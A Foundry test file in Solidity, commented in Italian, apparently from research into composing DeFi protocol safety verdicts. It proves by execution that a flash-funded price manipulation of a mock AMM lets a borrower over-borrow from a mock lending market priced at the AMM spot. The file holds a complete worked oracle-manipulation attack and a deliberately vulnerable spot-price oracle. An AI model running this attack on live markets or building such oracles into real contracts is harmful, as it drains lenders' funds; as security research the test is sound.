// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// BRICK 5b — il caso POSITIVO della composizione: super-additivita' via ORACOLO ESTERNO flash-recuperabile.
// CoupledGate.t.sol ha falsificato la composizione vault-interna (weakest-link REGGE). Qui dimostro, per ESECUZIONE,
// che DUE componenti individualmente SAFE compongono in un exploit QUANDO il prestito dipende da un prezzo-spot AMM
// flash-manipolabile (la vera classe oracle-manipulation):
//   A' = AMM constant-product CON FEE 30bps (slippage REALE -> niente strawman). Da solo: safe (swap perde fee).
//   B' = mercato di prestito con CUSTODIA del collaterale, prezzato allo spot di A'. Da solo: safe (borrow fair <= coll).
//   A' o B' = pump A' (flash), over-borrow da B', dump A' (recupera flash), abbandona -> profit > 0.
// FINDING (asserito): profit(A'oB') > max(MEV(A'), MEV(B')) AND > 0 -> super-additivita' CONFERMATA per esecuzione.
// => in algebra.py il flag `monotone` deve essere False quando un link dipende da un oracolo-esterno-manipolabile
//    (B' qui), declassando il protocol_verdict ad ABSTAIN (mai falso-IMMUNE). Verifica avversariale: la magnitudine
//    misurata deve corrispondere alla stima analitica coll0*(LTV*pump - 1) - fee (no free money).
import "forge-std/Test.sol";
import {MockToken} from "../src/Targets.sol";

// === A' : AMM constant-product (x*y=k) con fee 30bps. Prezzo-spot = reserveStable/reserveColl. ===
contract MockCPAMM {
    MockToken public immutable stable; MockToken public immutable coll;
    uint256 public rS; uint256 public rC;                 // riserve
    uint256 constant FEE_BPS = 30;                        // 0.30% per swap (slippage reale)
    constructor(MockToken _s, MockToken _c, uint256 _rS, uint256 _rC) {
        stable = _s; coll = _c; rS = _rS; rC = _rC;
    }
    function _out(uint256 amtIn, uint256 rIn, uint256 rOut) internal pure returns (uint256) {
        uint256 amtInFee = amtIn * (10000 - FEE_BPS) / 10000;
        return rOut * amtInFee / (rIn + amtInFee);
    }
    // swap stable -> coll (compra coll, alza il prezzo)
    function buyColl(uint256 amtStableIn) external returns (uint256 outColl) {
        require(stable.transferFrom(msg.sender, address(this), amtStableIn), "in");
        outColl = _out(amtStableIn, rS, rC);
        rS += amtStableIn; rC -= outColl;
        coll.transfer(msg.sender, outColl);
    }
    // swap coll -> stable (vende coll, abbassa il prezzo)
    function sellColl(uint256 amtCollIn) external returns (uint256 outStable) {
        require(coll.transferFrom(msg.sender, address(this), amtCollIn), "in");
        outStable = _out(amtCollIn, rC, rS);
        rC += amtCollIn; rS -= outStable;
        stable.transfer(msg.sender, outStable);
    }
    // SPOT NAIVE: valore in stable di `c` coll = c * rS / rC  (l'oracolo che B' usa, manipolabile)
    function collValueInStable(uint256 c) external view returns (uint256) { return c * rS / rC; }
}

// === B' : mercato di prestito. Custodia del collaterale COLL, prestito STABLE a LTV * spot(A'). ===
contract OracleLendingMarket {
    MockToken public immutable stable; MockToken public immutable coll; MockCPAMM public immutable amm;
    uint256 public immutable ltvBps;
    mapping(address => uint256) public collateralOf;
    constructor(MockToken _s, MockToken _c, MockCPAMM _amm, uint256 _ltv) {
        stable = _s; coll = _c; amm = _amm; ltvBps = _ltv;
    }
    function depositCollateral(uint256 amt) external {
        require(coll.transferFrom(msg.sender, address(this), amt), "coll");
        collateralOf[msg.sender] += amt;
    }
    function borrow() external returns (uint256 lent) {
        uint256 value = amm.collValueInStable(collateralOf[msg.sender]);   // prezzato allo SPOT (manipolabile)
        lent = value * ltvBps / 10000;
        stable.transfer(msg.sender, lent);                                 // nessun rimborso: l'attaccante abbandona
    }
}

contract OracleCoupledGate is Test {
    address atk = address(0xA11CE);
    address sink = address(0xF1A5);
    uint256 constant R = 1_000_000e18;     // riserve AMM (p0 = 1 stable/coll)
    uint256 constant COLL0 = 100_000e18;   // collaterale onesto dell'attaccante (fair value 100k)
    uint256 constant LTV = 9000;           // 90%

    function _setup() internal returns (MockToken stable, MockToken coll, MockCPAMM amm, OracleLendingMarket b) {
        stable = new MockToken(); coll = new MockToken();
        amm = new MockCPAMM(stable, coll, R, R);
        stable.mint(address(amm), R); coll.mint(address(amm), R);       // finanzia le riserve AMM
        b = new OracleLendingMarket(stable, coll, amm, LTV);
        stable.mint(address(b), 10_000_000e18);                          // riserva di prestito di B'
    }

    // MEV(A') da solo: swap stable->coll->stable senza altro. Atteso <= 0 (perde 2x fee).
    function _mevAmmAlone() internal returns (int256) {
        (MockToken stable, MockToken coll, MockCPAMM amm, ) = _setup();
        uint256 F = 400_000e18;
        stable.mint(atk, F);
        vm.startPrank(atk);
        stable.approve(address(amm), type(uint256).max); coll.approve(address(amm), type(uint256).max);
        uint256 c = amm.buyColl(F);
        uint256 backS = amm.sellColl(c);
        vm.stopPrank();
        return int256(backS) - int256(F);    // round-trip: perde le fee
    }

    // MEV(B') da solo: deposita collaterale, prende a prestito al prezzo FAIR (no manip), abbandona. Atteso <= 0.
    function _mevLendAlone() internal returns (int256) {
        (MockToken stable, MockToken coll, , OracleLendingMarket b) = _setup();
        coll.mint(atk, COLL0);
        uint256 fairValue = COLL0;            // p0 = 1
        vm.startPrank(atk);
        coll.approve(address(b), type(uint256).max);
        b.depositCollateral(COLL0);
        uint256 lent = b.borrow();            // al prezzo fair: LTV * COLL0
        vm.stopPrank();
        return int256(lent) - int256(fairValue);   // (LTV-1)*fair < 0
    }

    // MEV(A' o B'): pump A' (flash), over-borrow da B', dump A' (recupera flash), abbandona il collaterale.
    function _mevCoupled() internal returns (int256 profit, uint256 lentOut, uint256 backOut) {
        (MockToken stable, MockToken coll, MockCPAMM amm, OracleLendingMarket b) = _setup();
        uint256 F = 414_213e18;               // ~ R*(sqrt2 - 1): pompa il prezzo ~2x (flash, da restituire)
        coll.mint(atk, COLL0);                // capitale onesto (collaterale)
        stable.mint(atk, F);                  // flash
        uint256 fairColl0 = COLL0;            // valore fair del collaterale forfeitato (p0=1)
        vm.startPrank(atk);
        coll.approve(address(b), type(uint256).max);
        stable.approve(address(amm), type(uint256).max); coll.approve(address(amm), type(uint256).max);
        b.depositCollateral(COLL0);           // collaterale in custodia di B'
        uint256 boughtC = amm.buyColl(F);     // PUMP: prezzo spot di coll sale
        lentOut = b.borrow();                 // B' valuta COLL0 al prezzo GONFIATO -> over-borrow
        backOut = amm.sellColl(boughtC);      // DUMP: recupera ~F (prezzo torna ~p0)
        stable.transfer(sink, F);             // ripaga il flash
        vm.stopPrank();
        // fine: coll attaccante = 0 (venduto), collaterale COLL0 perso in B'; profit = stable residuo - fair del collaterale
        profit = int256(stable.balanceOf(atk)) - int256(fairColl0);
    }

    function testOracleCouplingSuperAdditive() public {
        int256 mevA = _mevAmmAlone();
        int256 mevB = _mevLendAlone();
        (int256 c, uint256 lent, uint256 back) = _mevCoupled();
        int256 maxSingle = mevA > mevB ? mevA : mevB;

        emit log_named_int("MEV_Amm_alone (swap roundtrip)", mevA);
        emit log_named_int("MEV_Lend_alone (fair borrow)", mevB);
        emit log_named_int("MEV_coupled (oracle manip)", c);
        emit log_named_uint("  borrowed_at_inflated", lent);
        emit log_named_uint("  recovered_from_dump", back);
        emit log_named_int("max(MEV_A,MEV_B)", maxSingle);

        // i singoli sono safe:
        assertLe(mevA, int256(0), "AMM round-trip deve perdere (fee) -> <=0");
        assertLe(mevB, int256(0), "prestito fair deve essere <=0 (ltv<1)");
        // la COMPOSIZIONE super-additiva:
        assertGt(c, int256(0), "coupled deve profittare (oracle manipulation)");
        assertGt(c, maxSingle, "SUPER-ADDITIVITA': profit(A'oB') > max(singoli) per ESECUZIONE");
        emit log_string("FINDING: super-additivita' CONFERMATA via oracolo-esterno flash-manipolabile (AMM-spot).");
        emit log_string("=> algebra.py: monotone=False quando un link dipende da oracolo-esterno-manipolabile -> ABSTAIN.");
    }
}
